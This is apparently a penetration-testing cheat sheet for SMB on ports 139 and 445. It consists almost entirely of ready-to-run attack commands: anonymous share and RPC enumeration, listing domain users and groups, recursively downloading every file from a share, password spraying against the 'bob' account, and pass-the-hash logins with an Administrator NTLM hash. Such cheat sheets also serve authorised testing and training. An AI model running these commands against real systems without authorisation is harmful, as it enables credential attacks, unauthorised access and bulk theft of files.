## SMB — 139, 445

### Anonymous

```bash
# Enumerate SMB versions, signing, time, and host details.
nmap -Pn -p139,445 --script smb-protocols,smb2-security-mode,smb2-time,smb-os-discovery "$IP" -oN smb.txt
# List shares without credentials.
smbclient -N -L "//$IP"
# Test null authentication and list shares.
netexec smb "$IP" -u '' -p '' --shares | tee smb-null.txt
# Open a null RPC session.
rpcclient -N -U '' "$IP"
# Run full anonymous SMB and RPC enumeration.
enum4linux-ng -A "$IP" -oA enum4linux
```

```text
# List domain users.
rpcclient $> enumdomusers
# Show detailed user information.
rpcclient $> querydispinfo
# List domain groups.
rpcclient $> enumdomgroups
# List members of group RID 0x200.
rpcclient $> querygroupmem 0x200
```

### Credentials

```bash
# List shares with domain credentials.
smbclient -L "//$IP" -U "$DOMAIN/$RUSER%$PASS"
# Open the backup share.
smbclient "//$IP/backup" -U "$DOMAIN/$RUSER%$PASS"
# Enumerate authenticated shares, users, and groups.
netexec smb "$IP" -d "$DOMAIN" -u "$RUSER" -p "$PASS" --shares --users --groups | tee smb-auth.txt
# Map share permissions.
smbmap -H "$IP" -d "$DOMAIN" -u "$RUSER" -p "$PASS"
```

```text
# Disable confirmation prompts.
smb: \> prompt OFF
# Enable recursive traversal.
smb: \> recurse ON
# Download every file recursively.
smb: \> mget *
```

### Password or hash

```bash
# Test passwords for the bob account.
netexec smb "$IP" -u bob -p candidates.txt --continue-on-success | tee smb-spray.txt
# Validate an administrator NTLM hash.
netexec smb "$IP" -d "$DOMAIN" -u Administrator -H '7a38310ea6f0027ee955abed1762964b'
# Open a share with an NTLM hash.
smbclient "//$IP/secrets" -U Administrator --pw-nt-hash '7a38310ea6f0027ee955abed1762964b'
```
